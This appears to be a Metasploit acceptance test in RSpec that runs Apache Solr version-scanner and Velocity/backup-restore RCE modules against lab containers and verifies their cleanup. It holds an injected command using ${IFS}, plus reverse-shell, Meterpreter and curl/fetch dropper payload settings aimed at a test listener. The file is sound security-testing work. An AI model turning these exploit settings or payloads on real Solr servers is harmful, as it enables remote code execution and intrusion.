require 'acceptance_spec_helper'
require 'net/http'
require 'English'
require 'timeout'

profile = ENV.fetch('SOLR_TARGET_PROFILE', 'velocity')
raise ArgumentError, "Unknown Solr profile: #{profile}" unless %w[velocity velocity_sessions backup].include?(profile)

RSpec.describe 'Native Apache Solr targets' do
  include_context 'module target'
  include_context 'wait_for_expect'

  before(:all) do
    kind = profile == 'backup' ? 'backup' : 'velocity'
    command = ['python3', '-B', "test/module_targets/solr_#{kind}/native_probe.py"]
    output, error, status = Open3.capture3(*command)
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-probe-status.json'), JSON.pretty_generate(argv: command, stderr: error, exitstatus: status.exitstatus))
    expect(status.success?).to be(true), error
    @native = JSON.parse(output)
    expect([@native.fetch('commands').length, @native.fetch('requests').length]).to eq(kind == 'backup' ? [36, 60] : [49, 66])
    expect(report_sql("SELECT count(*) FROM information_schema.tables WHERE table_schema='public'").strip).to eq('0')
    expect(console_command('db_connect module_framework:module-target-framework-db-password@reporting_db:5432/module_targets', timeout: 120)).not_to match(/\[-\]|Error|Exception/)
    expect(console_command('db_status')).to include('Connected to module_targets. Connection type: postgresql.')
    schema = report_sql("SELECT table_name, column_name, data_type FROM information_schema.columns WHERE table_schema='public' ORDER BY table_name, ordinal_position")
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-reporting-schema.txt'), schema)
    expect(schema).to include('services|info|text', 'metasploit_credential_privates|data|text')
  end

  before do |example|
    @workspace = "solr_#{example.metadata.fetch(:scoped_id).tr(':', '_')}"
    expect(console_command("workspace -a #{@workspace}")).not_to include('[-]')
    expect(service_rows).to eq([])
    expect(credential_rows).to eq([])
  end

  after do
    service_rows if @workspace
    credential_rows if @workspace
  end

  unless profile == 'velocity_sessions'
    services = profile == 'backup' ? %w[vulnerable secured fixed] : %w[legacy secured boundary fixed]
    services.each do |service|
      it "discovers and checks genuine #{service} twice using #{profile} policy" do
        2.times do
          scan = scan_version(service)
          expected = service_summary(service)
          expect(scan).to include(expected)
          expect(service_rows).to include(hash_including('address' => module_endpoint(service).fetch('host'), 'port' => 8983, 'info' => expected))
          checked = check_target(service)
          reason = if service == 'fixed' || service == 'boundary'
                     'Running version of Solr is not vulnerable!'
                   elsif profile == 'backup'
                     "Found Apache Solr version: #{native_profile(service).fetch('version')}"
                   else
                     'Successfully verified remote code execution'
                   end
          expect(checked).to include(reason)
          expected_credentials = service == 'secured' ? [{ 'username' => 'solr', 'private_data' => 'module-target-solr-password' }] : []
          expect(credential_rows).to eq(expected_credentials)
        end
      end
    end

    negatives = {
      'incorrect password' => { 'PASSWORD' => 'wrong-password' },
      'valid user with denied role' => { 'USERNAME' => 'viewer', 'PASSWORD' => 'module-target-viewer-password' }
    }
    negatives['absent credentials'] = { 'USERNAME' => '', 'PASSWORD' => '' } if profile == 'backup'
    negatives.each do |label, options|
      it "uses the real admin UI fallback and refuses exploitation checks with #{label}" do
        2.times do
          scan = scan_version('secured', options)
          expect(scan).to include(service_summary('secured'), 'identified from admin UI asset versions')
          expect(check_target('secured', options)).to include('Authentication failed!')
          expect(credential_rows).to eq([])
        end
      end
    end

    { 'missing application path' => [services.first, { 'TARGETURI' => '/module-target-no-solr/' }], 'unrelated actual HTTP' => ['unrelated', {}] }.each do |label, (service, options)|
      it "does not identify or exploit #{label}" do
        2.times do
          expect(scan_version(service, options)).not_to include('[+] Apache Solr')
          expect(check_target(service, options)).to include('Authentication failed!')
          expect(service_rows).to eq([])
          expect(credential_rows).to eq([])
        end
      end
    end
  end

  unless profile == 'velocity_sessions'
    (profile == 'backup' ? %w[vulnerable secured] : %w[legacy secured]).each do |service|
      it "executes a fresh command twice on #{service} with documented operator restoration" do
        with_solr_state(service) do
          2.times do
            path = '/tmp/module-target-solr-command-proof'
            target_exec(service, 'test', '!', '-e', path)
            options = { 'TARGET' => profile == 'backup' ? 0 : 1, 'PAYLOAD' => 'cmd/unix/generic', 'CMD' => "printf${IFS}module-target-solr-command-proof>#{path}", 'DisablePayloadHandler' => true, 'WfsDelay' => 0 }
            run_target_module(exploit_module, service, exploit_options(service).merge(options), command_timeout: 120)
            wait_for_expect(15, 0.1) { expect(target_exec(service, 'sh', '-c', "if test -f #{path}; then cat #{path}; fi")).to eq('module-target-solr-command-proof') }
            expect(target_exec(service, 'stat', '-c', '%U', path).strip).to eq('solr')
            restore_solr_state(service, @solr_before)
          end
        end
      end
    end
  end

  deliveries = if profile == 'backup'
                 { 'fetched Linux Meterpreter' => { 'TARGET' => 0, 'PAYLOAD' => 'cmd/linux/http/x64/meterpreter/reverse_tcp', 'FETCH_SRVPORT' => 8082, 'FETCH_DELETE' => true, 'FETCH_FILENAME' => 'module-target-solr-fetch', 'FETCH_WRITABLE_DIR' => '/tmp/' } }
               elsif profile == 'velocity_sessions'
                 {
                   'Java Meterpreter' => { 'TARGET' => 0, 'PAYLOAD' => 'java/meterpreter/reverse_tcp', 'SRVPORT' => 8081 },
                   'Unix Bash shell' => { 'TARGET' => 1, 'PAYLOAD' => 'cmd/unix/reverse_bash' },
                   'Linux curl dropper' => { 'TARGET' => 2, 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp', 'CMDSTAGER::FLAVOR' => 'curl', 'SRVPORT' => 8081 }
                 }
               else
                 {}
               end
  (profile == 'backup' ? %w[vulnerable secured] : %w[legacy secured]).each do |service|
    deliveries.each do |description, delivery|
      it "opens and uses #{description} twice on #{service} with actual target and cleanup proof" do
        @fetch_delete_path = File.join(delivery.fetch('FETCH_WRITABLE_DIR'), delivery.fetch('FETCH_FILENAME')) if delivery['FETCH_DELETE']
        with_solr_state(service) do
          2.times do
            path = '/tmp/module-target-solr-session-proof'
            target_exec(service, 'test', '!', '-e', path)
            expect(console_command('sessions -l')).to include('No active sessions')
            expect(console_command('jobs -l')).to include('No active jobs')
            prove_listener_cleanup
            options = delivery.merge('LHOST' => listener_host, 'LPORT' => 4445, 'WfsDelay' => 15, 'DisablePayloadHandler' => false)
            options[profile == 'backup' ? 'FETCH_SRVHOST' : 'SRVHOST'] = listener_host
            output = run_target_module(exploit_module, service, exploit_options(service).merge(options), action: 'run -z', command_timeout: 120)
            session_id = output[/(?:Command shell|Meterpreter) session (\d+) opened/, 1]
            expect(session_id).not_to be_nil, output
            meterpreter = delivery.fetch('PAYLOAD').include?('meterpreter')
            command = meterpreter ? "execute -f /usr/bin/touch -a #{path}" : "/usr/bin/touch #{path}"
            proof = console_command("sessions -i #{session_id} #{meterpreter ? '-C' : '-c'} #{command.inspect}")
            expect(proof).not_to match(/\[-\]|Exception|Unknown command/)
            wait_for_expect(15, 0.1) { expect(target_exec(service, 'sh', '-c', "if test -f #{path}; then stat -c %U #{path}; fi").strip).to eq('solr') }
            console_command('sessions -K')
            console_command('jobs -K')
            expect(console_command('sessions -l')).to include('No active sessions')
            fetch_url = output[%r{http://[^\s;]+:8082/[^\s;]+}] if backup_profile?
            expect(fetch_url).not_to be_nil, output if backup_profile?
            prove_listener_cleanup(fetch_url: fetch_url)
            expect(native_json(service, '/solr/admin/info/system').dig('lucene', 'solr-spec-version')).to eq(native_profile(service).fetch('version'))
            restore_solr_state(service, @solr_before)
          end
        end
      end
    end
  end

  def exploit_module
    backup_profile? ? 'exploit/linux/http/apache_solr_backup_restore' : 'exploit/multi/http/solr_velocity_rce'
  end

  def native_profile(service)
    @native.fetch('profiles').fetch(service)
  end

  def module_endpoint(service)
    target_runtime.fetch('module_endpoints').fetch(service)
  end

  def credentials(service)
    service == 'secured' ? { 'USERNAME' => 'solr', 'PASSWORD' => 'module-target-solr-password' } : {}
  end

  def service_summary(service)
    info = native_profile(service)
    summary = "Apache Solr #{info.fetch('version')}"
    summary += " (Lucene #{info.fetch('lucene')})" if info.fetch('lucene') != info.fetch('version')
    summary
  end

  def scan_version(service, options = {})
    run_target_module('auxiliary/scanner/http/apache_solr_version', service, { 'TARGETURI' => '/solr/', 'THREADS' => 1 }.merge(credentials(service)).merge(options), allow_errors: true)
  end

  def check_target(service, options = {})
    run_target_module(exploit_module, service, { 'TARGETURI' => '/solr/' }.merge(credentials(service)).merge(options), action: 'check', allow_errors: true)
  end

  def exploit_options(service)
    { 'TARGETURI' => '/solr/', 'SSL' => false }.merge(credentials(service))
  end

  def temporary_files(service)
    target_exec(service, 'find', '/tmp', '-maxdepth', '1', '-type', 'f', '-print').lines.map(&:strip).sort
  end

  def solr_state(service)
    state = { files: temporary_files(service) }
    if backup_profile?
      state[:collections] = native_json(service, '/solr/admin/collections?action=LIST&wt=json').fetch('collections').sort
      state[:configs] = native_json(service, '/solr/admin/configs?action=LIST&wt=json').fetch('configSets').sort
      state[:directories] = target_exec(service, 'find', '/var/solr/data', '-mindepth', '1', '-maxdepth', '1', '-type', 'd', '-printf', '%f\n').lines.map(&:strip).sort
    else
      core = native_profile(service).fetch('core')
      state[:writer] = native_json(service, "/solr/#{core}/config/queryResponseWriter").dig('config', 'queryResponseWriter', 'velocity')
    end
    state
  end

  def with_solr_state(service)
    @solr_before = solr_state(service)
    yield
  ensure
    restore_solr_state(service, @solr_before) if @solr_before
  end

  def restore_solr_state(service, before)
    original_error = $ERROR_INFO
    prove_fetch_deletion(service) if @fetch_delete_path
    after = solr_state(service)
    @cleanup_index = (@cleanup_index || 0) + 1
    added_files = after.fetch(:files) - before.fetch(:files)
    added_directories = backup_profile? ? after.fetch(:directories) - before.fetch(:directories) : []
    (added_files + added_directories.map { |name| "/var/solr/data/#{name}" }).each_with_index do |path, index|
      destination = File.join(target_runtime.fetch('artifacts'), "target-#{@workspace}-#{@cleanup_index}-#{index}")
      output, error, status = Open3.capture3(*target_runtime.fetch('compose'), 'cp', "#{service}:#{path}", destination)
      File.open(File.join(target_runtime.fetch('artifacts'), 'target-captures.jsonl'), 'a') { |log| log.puts(JSON.generate(service: service, path: path, destination: destination, status: status.exitstatus, stdout: output, stderr: error)) }
      expect(status.success?).to be(true), error
    end
    File.open(File.join(target_runtime.fetch('artifacts'), 'operator-restoration.jsonl'), 'a') { |log| log.puts(JSON.generate(service: service, before: before, after_module: after, removed_files: added_files, removed_directories: added_directories)) }
    if backup_profile?
      expect(after.fetch(:collections)).to eq(before.fetch(:collections))
      expect(after.fetch(:configs)).to eq(before.fetch(:configs))
      expect(added_directories).to all(match(/\A[A-Za-z0-9_-]+\z/))
      target_exec(service, 'rm', '-rf', '--', *added_directories.map { |name| "/var/solr/data/#{name}" }) unless added_directories.empty?
    else
      core = native_profile(service).fetch('core')
      native_json(service, "/solr/#{core}/config", method: :post, data: { 'update-queryresponsewriter' => before.fetch(:writer).merge('name' => 'velocity') }) if after.fetch(:writer) != before.fetch(:writer)
    end
    target_exec(service, 'rm', '-f', '--', *added_files) unless added_files.empty?
    expect(solr_state(service)).to eq(before)
  rescue RSpec::Expectations::ExpectationNotMetError, StandardError => e
    File.open(File.join(target_runtime.fetch('artifacts'), 'restoration-errors.jsonl'), 'a') { |log| log.puts(JSON.generate(service: service, error: e.class.name, message: e.message)) }
    RSpec.world.wants_to_quit = true
    raise unless original_error
  end

  def prove_listener_cleanup(fetch_url: nil)
    # These profiles own the last reference to their Fetch service. Component
    # tests separately prove that cleanup preserves concurrent server owners.
    ports = [4445, 8081, 8082]
    script = 'require "json"; rows=%w[/proc/net/tcp /proc/net/tcp6].flat_map { |path| File.readlines(path).drop(1).map(&:split) }; puts JSON.generate(rows.select { |row| row[3]=="0A" && ' + ports.inspect + '.include?(row[1].split(":").last.to_i(16)) })'
    wait_for_expect(15, 0.2) do
      expect(JSON.parse(target_exec('framework', 'ruby', '-e', script))).to eq([])
    end
    return unless backup_profile?

    code = 'puts "MODULE_TARGET_FETCH_POOL:" + JSON.generate(Rex::ServiceManager.instance.values.uniq.grep(Rex::Proto::Http::Server).select { |server| server.listen_port == 8082 }.map { |server| { object_id: server.object_id, host: server.listen_host, port: server.listen_port, owner: server.context["MsfExploit"].refname, resources: server.resources.keys, references: server.instance_variable_get(:@_references) } })'
    output = console_command("irb -e #{code.inspect}")
    captured = output[/^MODULE_TARGET_FETCH_POOL:(\[.*\])\r?$/, 1]
    expect(captured).not_to be_nil, output
    pool = JSON.parse(captured)
    File.open(File.join(target_runtime.fetch('artifacts'), 'fetch-pool-state.jsonl'), 'a') { |log| log.puts(JSON.generate(workspace: @workspace, fetch_url: fetch_url, pool: pool)) }
    expect(pool).to eq([])
    if fetch_url
      uri = URI(fetch_url)
      expect([uri.host, uri.port]).to eq([listener_host, 8082])
      response = JSON.parse(target_exec('framework', 'ruby', 'test/module_targets/solr_backup/fetch_probe.rb', fetch_url))
      File.open(File.join(target_runtime.fetch('artifacts'), 'fetch-resource-removal.jsonl'), 'a') { |log| log.puts(JSON.generate(workspace: @workspace, url: fetch_url, response: response)) }
    end
    expect(response.slice('state', 'error')).to eq('state' => 'refused', 'error' => 'Errno::ECONNREFUSED') if fetch_url
  end

  def report_sql(query)
    target_exec('reporting_db', 'env', 'PGPASSWORD=module-target-framework-db-password', 'psql', '-h', '127.0.0.1', '-U', 'module_framework', '-d', 'module_targets', '-v', 'ON_ERROR_STOP=1', '-Atc', query)
  end

  def service_rows
    raise ArgumentError, 'Invalid fixture workspace' unless @workspace.match?(/\Asolr_[0-9_]+\z/)

    query = <<~SQL
      SELECT coalesce(json_agg(record ORDER BY record.id), '[]'::json) FROM (
        SELECT service.id, split_part(host.address::text, '/', 1) AS address,
               service.port, service.name, service.info
        FROM services service
        JOIN hosts host ON host.id=service.host_id
        JOIN workspaces workspace ON workspace.id=host.workspace_id
        WHERE workspace.name='#{@workspace}'
      ) record;
    SQL
    rows = JSON.parse(report_sql(query))
    File.write(File.join(target_runtime.fetch('artifacts'), "services-#{@workspace}.json"), JSON.pretty_generate(rows))
    rows
  end

  def credential_rows
    query = <<~SQL
      SELECT coalesce(json_agg(record ORDER BY record.username, record.private_data), '[]'::json) FROM (
        SELECT credential_public.username, secret.data AS private_data
        FROM metasploit_credential_cores core
        JOIN workspaces workspace ON workspace.id=core.workspace_id
        JOIN metasploit_credential_publics credential_public ON credential_public.id=core.public_id
        JOIN metasploit_credential_privates secret ON secret.id=core.private_id
        WHERE workspace.name='#{@workspace}'
      ) record;
    SQL
    rows = JSON.parse(report_sql(query))
    File.write(File.join(target_runtime.fetch('artifacts'), "credentials-#{@workspace}.json"), JSON.pretty_generate(rows))
    rows
  end

  def native_http(service, path, method: :get, data: nil)
    endpoint = target_endpoint(service)
    http = Net::HTTP.new(endpoint.fetch('host'), endpoint.fetch('port'), nil)
    http.open_timeout = 5
    http.read_timeout = 20
    request = method == :get ? Net::HTTP::Get.new(path) : Net::HTTP::Post.new(path)
    request.basic_auth('solr', 'module-target-solr-password') if service == 'secured'
    if data
      request['Content-Type'] = 'application/json'
      request.body = JSON.generate(data)
    end
    response = http.request(request)
    File.open(File.join(target_runtime.fetch('artifacts'), 'native-inspector.jsonl'), 'a') do |log|
      log.puts(JSON.generate(service: service, path: path, method: method, data: data, code: response.code.to_i, body: response.body))
    end
    response
  end

  def native_json(service, path, **options)
    response = native_http(service, path, **options)
    expect(response.code).to eq('200'), response.body
    JSON.parse(response.body)
  end
end

# Family-local transport and asynchronous cleanup controls.
module SolrTargetControls
  def backup_profile?
    ENV.fetch('SOLR_TARGET_PROFILE', 'velocity') == 'backup'
  end

  def prove_fetch_deletion(service)
    # FETCH_DELETE removes this exact download after a randomized 3..7 seconds.
    # Prove deletion before taking an inventory that will be copied for evidence.
    Timeout.timeout(20) do
      wait_for_expect(100, 0.1) do
        expect(target_exec(service, 'sh', '-c', 'if test -e "$1"; then printf present; else printf absent; fi', 'sh', @fetch_delete_path)).to eq('absent')
      end
    end
    File.open(File.join(target_runtime.fetch('artifacts'), 'fetch-file-cleanup.jsonl'), 'a') { |log| log.puts(JSON.generate(service: service, path: @fetch_delete_path, absent: true)) }
  end

  # Stops after transport loss so later labels cannot become false module verdicts.
  def console_command(command, timeout: 40)
    raise Acceptance::ChildProcessTimeoutError, 'Console failed; diagnostic stopped' if @console_broken

    super
  rescue Acceptance::ChildProcessTimeoutError, Acceptance::ChildProcessRecvError, EOFError, Errno::EPIPE
    @console_broken = true
    RSpec.world.wants_to_quit = true
    raise
  end
end

group = RSpec.world.example_groups.find { |item| item.description == 'Native Apache Solr targets' }
raise 'Solr target group is missing' unless group

group.prepend(SolrTargetControls)
